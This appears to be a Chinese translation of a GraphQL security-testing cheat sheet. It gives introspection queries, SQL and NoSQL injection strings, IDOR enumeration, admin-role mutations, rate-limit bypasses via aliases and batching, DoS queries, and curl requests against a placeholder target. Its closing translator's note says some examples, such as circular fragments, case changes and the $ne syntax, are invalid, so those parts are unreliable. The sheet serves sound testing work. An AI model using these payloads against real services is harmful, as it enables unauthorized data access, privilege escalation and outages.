<a id="-graphql-injection-cheatsheet"></a>
# 📊 GraphQL 注入速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](./GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-graphql-basics"></a>
## 🔍 GraphQL 基础

<a id="common-endpoints"></a>
### 常见端点
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

<a id="request-structure"></a>
### 请求结构
```graphql
# 查询
{
  user(id: 1) {
    name
    email
  }
}

# 带操作名称
query GetUser {
  user(id: 1) {
    name
  }
}

# 变更操作
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

<a id="-introspection-queries"></a>
## 🎯 内省查询

<a id="full-schema-introspection"></a>
### 完整模式内省
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

<a id="query-type-entry-points"></a>
### 查询类型（入口）
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="mutation-type"></a>
### 变更类型
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="all-types"></a>
### 所有类型
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

<a id="specific-type-details"></a>
### 指定类型的详细信息
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

<a id="-injection-attacks"></a>
## 💉 注入攻击

<a id="sql-injection-via-graphql"></a>
### 通过 GraphQL 进行 SQL 注入
```graphql
# 在参数中注入
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# 基于 UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

<a id="nosql-injection"></a>
### NoSQL 注入
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# 或使用 JSON 形式
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

<a id="idor-insecure-direct-object-reference"></a>
### IDOR（不安全的直接对象引用）
```graphql
# 访问其他用户的数据
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# 枚举所有用户
{
  users {
    id
    name
    email
    role
  }
}
```

---

<a id="-authorization-bypass"></a>
## 🔥 授权绕过

<a id="missing-auth-on-mutations"></a>
### 变更操作缺少授权检查
```graphql
# 尝试以普通用户身份执行管理员操作
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

<a id="nested-query-bypass"></a>
### 嵌套查询绕过
```graphql
# 通过对象关联访问敏感数据
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

<a id="field-suggestion-abuse"></a>
### 字段建议滥用
```graphql
# 若已启用字段建议，可尝试无效字段
{
  user(id: 1) {
    passwor  # 可能建议 "password"
  }
}
```

---

<a id="-information-disclosure"></a>
## 🚀 信息泄露

<a id="debug-information"></a>
### 调试信息
```graphql
# 基于错误信息枚举
{
  __typename
}

# 使用无效查询获取堆栈信息
{
  invalid_field_that_doesnt_exist
}
```

<a id="sensitive-field-discovery"></a>
### 敏感字段发现
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技巧

<a id="alias-based-bypass"></a>
### 利用别名绕过
```graphql
# 使用别名绕过速率限制
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

<a id="batching-attacks"></a>
### 批量查询攻击
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

<a id="case-manipulation"></a>
### 大小写变换
```graphql
# 尝试不同大小写
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

<a id="fragment-injection"></a>
### 片段注入
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

<a id="-dos-attacks"></a>
## 💣 拒绝服务（DoS）攻击

<a id="deep-query-attack"></a>
### 深层查询攻击
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

<a id="circular-fragment"></a>
### 循环片段
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # 循环引用
}
```

<a id="large-result-set"></a>
### 大型结果集
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

<a id="-testing-tools"></a>
## 🛠️ 测试工具

<a id="graphql-voyager"></a>
### GraphQL Voyager
```bash
# 可视化模式
https://graphql-kit.com/graphql-voyager/
# 粘贴内省查询结果
```

<a id="inql-burp-extension"></a>
### InQL (Burp 扩展)
```
# 功能：
- 模式提取
- 查询生成
- 漏洞扫描
```

<a id="graphql-cop"></a>
### graphql-cop
```bash
# 安全审计工具
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

<a id="graphw00f"></a>
### graphw00f
```bash
# GraphQL 指纹识别
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

<a id="altair-graphql-client"></a>
### Altair GraphQL 客户端
```
# 用于测试的桌面客户端
https://altairgraphql.dev/
```

---

<a id="-curl-examples"></a>
## 📝 cURL 示例

<a id="basic-query"></a>
### 基本查询
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

<a id="with-variables"></a>
### 使用变量
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

<a id="introspection"></a>
### 内省
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

<a id="with-auth"></a>
### 携带身份凭据
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

<a id="-testing-checklist"></a>
## 📋 测试清单

```markdown
## GraphQL 安全测试清单

□ 识别 GraphQL 端点
□ 检查内省（模式提取）
□ 提取所有查询与变更操作
□ 测试对象查询中的 IDOR
□ 测试变更操作的授权检查
□ 检查参数中的 SQL/NoSQL 注入
□ 测试嵌套查询是否泄露数据
□ 检查速率限制（别名绕过）
□ 测试批量查询
□ 检查敏感字段（password、token）
□ 测试深度限制（DoS）
□ 检查错误信息泄露
□ 测试订阅端点
```

---

<a id="-common-vulnerabilities-summary"></a>
## 🔗 常见漏洞汇总

| 漏洞 | 测试 | 影响 |
|---------------|------|--------|
| **开放内省** | 查询 `__schema` | 模式泄露 |
| **IDOR** | 更改查询中的 ID | 访问其他用户的数据 |
| **缺少身份验证或授权** | 不携带令牌进行查询 | 未授权访问 |
| **SQLi/NoSQLi** | 向参数中注入 | 数据库受侵害 |
| **返回过多数据** | 查询敏感字段 | 数据泄露 |
| **DoS** | 深层／循环查询 | 服务不可用 |
| **批量请求滥用** | 多个查询 | 速率限制绕过 |

---

<a id="-related-payloads"></a>
## 🔗 相关载荷

- [SQL 注入载荷](./SQLi.zh-CN.md)
- [NoSQL 注入](./NoSQL-Injection.zh-CN.md)
- [API 安全](../../API-Security/translations/README.zh-CN.md)

---

**返回载荷目录：** 原文所指的载荷索引不可用（`./README.md`）；本目录没有英文 README，故未创建翻译索引。

> 译注：[GraphQL 规范](https://spec.graphql.org/September2025/)要求片段不得形成循环，名称区分大小写；符合规范的服务应拒绝循环片段，改变字段大小写也不是通用绕过方式。内省本身是标准功能，风险取决于暴露内容和访问策略；本页“完整模式内省”仅展示部分字段。SQL/NoSQL 注入还要求参数类型和后端处理允许该输入；直接含 $ne 的 GraphQL 字段语法示例不符合名称语法。JSON 数组批处理取决于服务端扩展。
